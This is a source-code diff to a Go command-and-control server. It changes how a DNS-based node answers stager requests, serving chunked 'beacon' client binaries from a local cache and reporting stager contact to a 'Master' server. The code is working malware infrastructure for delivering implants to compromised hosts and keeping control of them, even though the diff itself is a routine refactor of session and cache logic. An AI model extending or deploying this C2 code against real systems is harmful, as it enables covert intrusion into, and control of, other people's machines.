@@ -1279,7 +1279,8 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 
 // handleStagerRequest processes a stager deployment request
 // Format: STG|IP|OS|ARCH
-// In distributed mode, checks local cache first for instant response
+// In distributed mode with cache, responds immediately with cached metadata
+// If no cache available, returns error (stager session should already exist from Master build)
 func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDuplicate bool) string {
 	if len(parts) < 4 {
 		return "ERROR"
@@ -1293,16 +1294,10 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 		logf("[C2] Stager request from %s (%s/%s) - IP: %s", clientIP, stagerOS, stagerArch, stagerIP)
 	}
 
-	// In distributed mode, check if we have cached chunks for this OS/Arch
+	// In distributed mode, ONLY serve from cache
+	// The cache should have been pushed during DNS server checkin
 	if masterClient != nil && c2.db != nil {
-		// Look for cached client binary matching OS/Arch
-		// Format: beacon-{os}-{timestamp} or just use the most recent cached binary
-		// For now, we'll look for any cached binary (since we only have one beacon per OS/Arch typically)
-
-		// Get cache count to see if we have ANY cached chunks
-		// We'll use a pattern match or just check if we have cached data
-		// For simplicity, let's query for the most recent client_binary_id in cache
-
+		// Look for cached client binary
 		rows, err := c2.db.db.Query(`
 			SELECT DISTINCT client_binary_id, COUNT(*) as chunk_count
 			FROM stager_chunk_cache
@@ -1324,11 +1319,12 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 						logf("[C2] 🚀 Cache HIT for stager! Using cached binary: %s (%d chunks)", clientBinaryID, chunkCount)
 					}
 
-					// Report session creation to Master (async, fire-and-forget)
+					// Report stager contact to Master (async, fire-and-forget)
+					// This just logs the contact, does NOT create a new session
 					go func() {
-						_, err := masterClient.InitStagerSession(stagerIP, stagerOS, stagerArch)
+						err := masterClient.ReportStagerContact(clientBinaryID, stagerIP, stagerOS, stagerArch)
 						if err != nil {
-							logf("[C2] Warning: Failed to report stager session to Master: %v", err)
+							logf("[C2] Warning: Failed to report stager contact to Master: %v", err)
 						}
 					}()
 
@@ -1356,34 +1352,16 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 			}
 		}
 
-		// Cache miss - fall back to Master
+		// Cache miss - NO FALLBACK to creating new session
+		// The cache should have been pushed when Master built the stager
 		if !isDuplicate {
-			logf("[C2] Cache MISS for stager, forwarding to Master...")
+			logf("[C2] ❌ Cache MISS for stager - no cached binary available!")
+			logf("[C2] Stager sessions should be created by Master build, not DNS server")
 		}
-
-		sessionInfo, err := masterClient.InitStagerSession(stagerIP, stagerOS, stagerArch)
-		if err != nil {
-			if !isDuplicate {
-				logf("[C2] Failed to init stager session with Master: %v", err)
-			}
-			return "ERROR|MASTER_UNAVAILABLE"
-		}
-
-		if !isDuplicate {
-			logf("[C2] Stager session created: %s (%d chunks across Shadow Mesh)",
-				sessionInfo.SessionID, sessionInfo.TotalChunks)
-		}
-
-		// Return META response with session ID and chunk count
-		// Format: META|<session_id>|<total_chunks>
-		metaResponse := fmt.Sprintf("META|%s|%d", sessionInfo.SessionID, sessionInfo.TotalChunks)
-		if !isDuplicate {
-			logf("[C2] Returning META response: %s (len=%d)", metaResponse, len(metaResponse))
-		}
-		return metaResponse
+		return "ERROR|NO_CACHE"
 	}
 
-	// Standalone mode fallback - use local client binary
+	// Standalone mode fallback - use local client binary (OLD BEHAVIOR, for backwards compatibility)
 	if !isDuplicate {
 		logf("[C2] Warning: Running in standalone mode, using local client binary")
 	}
